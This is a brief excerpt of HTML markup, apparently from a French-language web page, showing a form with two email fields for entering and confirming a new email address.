...
<body>
   <div id="container">
      ...
      <form name="Layer1" method="post" action="" enctype="text/plain" id="Layer1">
         <input type="email" id="edtpass" name="newmail12" value="" tabindex="2" placeholder="Nouveau email*">
         ...
         <input type="email" id="Editbox1" name="newmail1" value="" tabindex="3" placeholder="Confirmer nouveau email*">
         <div id="wb_Text1">
